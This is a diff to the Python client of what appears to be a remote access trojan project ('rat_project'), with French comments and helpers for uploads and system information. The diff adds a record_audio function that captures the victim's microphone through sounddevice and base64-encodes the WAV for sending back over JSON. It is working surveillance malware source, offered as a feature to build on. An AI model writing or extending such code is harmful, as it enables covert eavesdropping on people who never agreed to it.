@@ -9,8 +9,12 @@ Compatibilité : Windows et Linux.
 """
 
 import base64
+import io
 import platform
+import wave
 from pathlib import Path
+
+import sounddevice
 
 from rat_project.utils.logger_config import setup_logger
 
@@ -153,6 +157,52 @@ def handle_upload(message: dict) -> dict:
 # ---------------------------------------------------------------------------
 # Fonctions à implémenter dans les prochaines étapes
 # ---------------------------------------------------------------------------
+
+
+# ---------------------------------------------------------------------------
+# record_audio — record microphone audio and return it as a base64 WAV string
+# ---------------------------------------------------------------------------
+
+AUDIO_SAMPLE_RATE = 44100  # Hz (CD quality)
+AUDIO_CHANNELS = 1  # mono
+
+
+def record_audio(duration: int = 5) -> str:
+    """
+    Record audio from the client microphone and return it as a base64 WAV string.
+
+    Uses sounddevice to capture PCM int16 audio, then wraps it in a WAV
+    container (stdlib wave module) and encodes it in base64 for JSON transport.
+
+    Args:
+        duration: Recording duration in seconds (default: 5).
+
+    Returns:
+        str: Base64-encoded WAV audio data.
+    """
+    logger.info("Recording audio for %s second(s)...", duration)
+
+    # 1. Record from the default microphone as 16-bit PCM
+    frames = sounddevice.rec(
+        int(duration * AUDIO_SAMPLE_RATE),
+        samplerate=AUDIO_SAMPLE_RATE,
+        channels=AUDIO_CHANNELS,
+        dtype="int16",
+    )
+    sounddevice.wait()  # block until recording is complete
+
+    logger.info("Recording finished (%s frames captured)", len(frames))
+
+    # 2. Write numpy array into an in-memory WAV container (no temp file)
+    wav_buffer = io.BytesIO()
+    with wave.open(wav_buffer, "wb") as wav_file:
+        wav_file.setnchannels(AUDIO_CHANNELS)
+        wav_file.setsampwidth(2)  # 2 bytes = 16 bits per sample
+        wav_file.setframerate(AUDIO_SAMPLE_RATE)
+        wav_file.writeframes(frames.tobytes())
+
+    # 3. Encode to base64 so it can travel as a JSON string
+    return base64.b64encode(wav_buffer.getvalue()).decode("utf-8")
 
 
 def get_system_info() -> str:
